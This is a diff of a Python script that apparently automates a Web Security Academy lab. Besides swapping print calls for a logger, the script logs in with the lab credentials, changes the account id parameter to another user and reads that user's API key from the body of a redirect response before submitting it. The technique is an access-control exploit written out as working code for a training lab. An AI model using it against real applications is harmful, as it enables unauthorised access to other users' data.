@@ -1,43 +1,43 @@
-from ..utils import *
-from bs4 import BeautifulSoup
+from web_security_academy.core.logger import logger
 from urllib.parse import urlencode, urljoin
+from bs4 import BeautifulSoup
 
-import requests
 import re
 
 
-def solve_lab(session, url):
+def solve_lab(session):
     csrf = session.get_csrf_token("/login")
 
     username, password = "wiener", "peter"
     data = {"csrf": csrf, "username": username, "password": password}
-    print_info(f'Logging in with the credentials "{username}:{password}"')
+    logger.info(f'Logging in with the credentials "{username}:{password}"')
     resp = session.post_path("/login", data=data)
 
     soup = BeautifulSoup(resp.text, "lxml")
     invalid_creds = soup.find(text="Invalid username or password.")
     if invalid_creds:
-        print_fail("Invalid credentials.")
+        logger.failure("Invalid credentials.")
+        return
     else:
-        print_success("Successfully logged in.\n")
+        logger.success("Successfully logged in.")
 
-    url = urljoin(url, "/my-account")
+    url = urljoin(session.url, "/my-account")
     params = {"id": "carlos"}
-    print_info(f'Visiting "{url}?{urlencode(params)}" without automatic redirects...')
+    logger.info(f'Visiting "{url}?{urlencode(params)}" without automatic redirects...')
     resp = session.get_path("/my-account", params=params, allow_redirects=False)
 
     if len(resp.text) != 0:
-        print_info_secondary("Found leaked information in the HTTP body.")
+        logger.info("Found leaked information in the HTTP body.")
     else:
-        print_fail("Did not find leaked information in the HTTP body.")
+        logger.failure("Did not find leaked information in the HTTP body.")
 
     soup = BeautifulSoup(resp.text, "lxml")
     regex = re.compile(r"Your API Key is: (.*)")
     match = soup.find(text=regex)
 
     if match is None:
-        print_fail("Unable to extract API key from HTTP response.")
+        logger.failure("Unable to extract API key from HTTP response.")
     else:
         api_key = re.match(regex, match).group(1)
-        print_success(f"API Key: {api_key}\n")
+        logger.success(f"API Key: {api_key}")
         session.submit_solution(api_key)
